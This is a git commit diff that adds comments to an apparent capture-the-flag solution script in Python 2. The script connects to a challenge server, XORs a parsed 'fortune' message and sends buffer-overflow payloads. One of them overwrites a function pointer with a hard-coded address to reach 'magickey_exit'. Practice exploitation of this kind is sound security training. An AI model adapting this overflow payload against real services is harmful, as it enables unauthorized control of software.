eec5361c6c41125e308aa67ab9edfd01a5446dda
Saccharide <rtang@email.wm.edu>
2018-03-26 09:31:14 -0700

    Added some explanation to our solution

--- challenge3/solution.py
+++ challenge3/solution.py
@@ -19,44 +19,59 @@ def ttt(s):
                 ret.append(chr(tmp))
         return "".join(ret)
 
-# parsing the fortune message
+# parsing the fortune message given by the server
 def getFortune(fortune):
 	return fortune.split("*Here's your fortune!*")[1].split("\n\nGive me your edits.\n")[0].split("\n\n")[1]
 
 
 # Main program
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("hackcoes.com",31337))
 
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+# Connect to the server, replace "localhose" to "hackcoes.com" for a live test
+s.connect(("localhost",31337))
+
+# First phase
 whoRu = s.recv(1024)
 print whoRu
 
 s.send("ubuntu")
+
+# Second phase
 greeting = s.recv(2048)
 print greeting
 
 fortune = s.recv(1024)
 print fortune
 
-#fortune = fortune.splitlines()[-3]
+# Parse the fortune message
 fortune = getFortune(fortune)
 print fortune
-
 fortune = fortune+"\n"
+
+# Xoiring the message
 output = ttt(fortune)
 print output
+
+
+# Testing the len of the original message with our xored message
 print "fortune len",len(fortune)
 print "output len",len(output)
+
+# Send it to the server
 s.send(bytearray(output))
+
+# Prints out the response from server
+print s.recv(1024)
 print s.recv(1024)
 
-print s.recv(1024)
+
+# Tells the server our new password, no need to buffer overflow for this one
 new_password = "A"*155#+"\x82\x91\x04\x08"
 s.send(bytearray(new_password))
-
 print s.recv(1024)
 
-# redireting the memory location to magickey_exit
+# Last phase, we need to rediret the memory location to magickey_exit, becuase this password is being used as a function pointer
 password = "A"*20+ "\x82\x91\x04\x08" #"\x73\x8B\x04\x08"
 
 s.send(bytearray(password))
@@ -65,6 +80,7 @@ s.send(bytearray(password))
 print s.recv(1024)
 print s.recv(1024)
 
+# Profit
 print s.recv(1024)
 print s.recv(1024)
 
